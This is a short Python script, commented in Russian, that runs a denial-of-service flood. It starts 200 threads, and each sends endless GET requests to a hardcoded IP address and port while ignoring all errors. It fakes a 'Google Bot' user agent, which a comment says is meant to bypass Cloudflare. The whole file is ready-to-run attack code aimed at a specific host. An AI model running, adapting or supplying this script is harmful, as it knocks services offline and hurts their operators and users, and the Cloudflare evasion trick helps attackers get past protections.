import requests
import threading


def ddos(url):
        # Устанавливаем headers Google бота, для обхода Cloudflare
        headers = {"User-Agent": "Google Bot"}

        if 'http' in url and '.' in url:
            # Отправляем сообщение о начале DDOS атаки
            print(f'DDOS атака на {url} успешно запущена')
        else:
            print(f'Ошибка: неверный url, проверьте правильность введенных данных')

        while True:
            try:
                # Отправляем GET запрос с данными
                requests.get(url, headers=headers,
                             allow_redirects=True, stream=True)
            except:
                pass


def run_threads(count, url):
    threads = [
        threading.Thread(target=ddos, args=(url,))
        for i in range(0, count)
    ]
    for thread in threads:
        thread.start()  # каждый поток должен быть запущен


run_threads(200, 'http://95.181.224.52:8023/')
